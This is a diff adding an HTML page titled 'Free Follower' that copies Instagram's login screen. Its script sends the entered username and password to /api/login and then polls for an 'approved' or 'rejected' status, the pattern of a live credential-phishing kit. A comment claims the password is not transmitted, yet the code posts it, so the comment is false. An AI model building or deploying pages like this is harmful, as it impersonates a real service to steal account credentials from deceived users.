@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Free Follower</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #fafafa;
+            font-family: Arial, sans-serif;
+        } */
+
+body {
+    background: #fafafa;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+
+
+        .box {
+            width: 350px;
+            background: white;
+            border: 1px solid #ddd;
+            padding: 40px;
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 36px;
+            font-size: 32px;
+            font-weight: 300;
+            font-family: 'Segoe Print', cursive;
+            letter-spacing: -1px;
+        }
+
+        p {
+            display: block;
+            margin-block-start: 1em;
+            margin-block-end: 1em;
+            margin-inline-start: 0px;
+            margin-inline-end: 0px;
+            unicode-bidi: isolate;
+        }
+
+        .divider {
+    display: flex;
+    align-items: center;
+    margin: 15px 0;
+    color: #999;
+    font-size: 13px;}
+
+    .divider span {
+    flex: 1;
+    height: 1px;
+    background: #dbdbdb;
+}
+
+.facebook-login {
+    width: 100%;
+    padding: 8px 0;
+    background: white;
+    color: #385185;
+    border: none;
+    font-weight: 600;
+    font-size: 13px;
+    cursor: pointer;
+    margin-top: 10px;
+}
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        /* button {
+            width: 100%;
+            padding: 11px;
+            border: 0;
+            border-radius: 5px;
+            background: #1683ff;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        } */
+
+        button {
+    appearance: auto;
+    font-style: ;
+    font-variant-ligatures: ;
+    font-variant-caps: ;
+    font-variant-numeric: ;
+    font-variant-east-asian: ;
+    font-variant-alternates: ;
+    font-variant-position: ;
+    font-variant-emoji: ;
+    font-weight: ;
+    font-stretch: ;
+    font-size: ;
+    font-family: ;
+    font-optical-sizing: ;
+    font-size-adjust: ;
+    font-kerning: ;
+    font-feature-settings: ;
+    font-variation-settings: ;
+    font-language-override: ;
+    text-rendering: auto;
+    color: buttontext;
+    letter-spacing: normal;
+    word-spacing: normal;
+    line-height: normal;
+    text-transform: none;
+    text-indent: 0px;
+    text-shadow: none;
+    display: inline-block;
+    text-align: center;
+    cursor: default;
+    box-sizing: border-box;
+    background-color: buttonface;
+    margin: 0em 0em 0em 0em;
+    padding-block: 1px;
+    padding-inline: 6px;
+    border-width: 2px;
+    border-style: outset;
+    border-color: buttonborder;
+    border-image: none;
+}
+
+
+.login-btn {
+    width: 100%;
+    padding: 8px 0;
+    background: #0095f6;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    margin-top: 10px;
+    transition: background 0.2s;
+}
+
+.forgot-password {
+    text-align: center;
+    margin-top: 16px;
+}
+
+
+.forgot-password a {
+    color: #385185;
+    font-size: 12px;
+    text-decoration: none;
+}
+
+div {
+    display: block;
+    unicode-bidi: isolate;
+}
+
+
+.signup-box {
+    background: white;
+    /* border: 1px solid #dbdbdb; */
+    border-radius: 1px;
+    padding: 15px 40px;
+    text-align: center;
+    font-size: 12px;
+    color: #666;
+}
+
+        .signup-box a {
+    color: #0095f6;
+    text-decoration: none;
+    font-weight: 600;
+}
+
+        #message {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="box">
+
+        <h1>Instagram</h1>
+
+        <form id="loginForm">
+
+            <input id="identifier" type="text" placeholder="Email, phone number, or username" required>
+
+            <!-- Password is intentionally NOT transmitted or stored. -->
+            <input id="password" type="password" placeholder="Password" required>
+
+            <button type="submit" class="login-btn">
+                Log In
+            </button>
+
+        </form>
+
+        <div id="message"></div>
+
+        <div class="divider"> 
+            <span></span>
+            <p>OR</p>
+             <span></span>
+        </div>
+
+        <button type="button" class="facebook-login">Log in with Facebook</button>
+
+        <div class="forgot-password"> <a href="#">Forgot password?</a> </div>
+        <div class="signup-box"> 
+            Don't have an account? 
+            <a href="#">Sign up</a> </div>
+    </div>
+
+    
+
+    <script>
+        const form = document.getElementById("loginForm");
+        const message = document.getElementById("message");
+
+        form.addEventListener("submit", async (event) => {
+            event.preventDefault();
+
+            const identifier = document.getElementById("identifier").value.trim();
+            const password = document.getElementById("password").value;
+
+            message.textContent = "";
+
+            try {
+                const response = await fetch("/api/login", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        identifier,
+                        password
+                    })
+                });
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(data.error || "Request failed");
+                }
+
+                checkStatus(data.requestId);
+            } catch (error) {
+                message.textContent = "Something went wrong. Please try again.";
+                console.error(error);
+            }
+        });
+
+
+        async function checkStatus(requestId) {
+
+            const timer = setInterval(async () => {
+
+                try {
+
+                    const response = await fetch(
+                        `/api/login-status/${requestId}`
+                    );
+
+                    const data = await response.json();
+
+                    if (data.status === "approved") {
+
+                        clearInterval(timer);
+
+                        message.textContent =
+                            "✅ Login approved.";
+
+                        // Yahan apne actual application's
+                        // authenticated-session endpoint par
+                        // redirect kar sakte hain.
+                        setTimeout(() => {
+                            window.location.href = "/dashboard.html";
+                        }, 700);
+
+                    }
+
+                    if (data.status === "rejected") {
+
+                        clearInterval(timer);
+
+                        message.textContent =
+                            "❌ Login request rejected.";
+                    }
+
+                } catch (error) {
+
+                    console.error(error);
+                }
+
+            }, 2000);
+        }
+    </script>
+
+</body>
+
+</html>
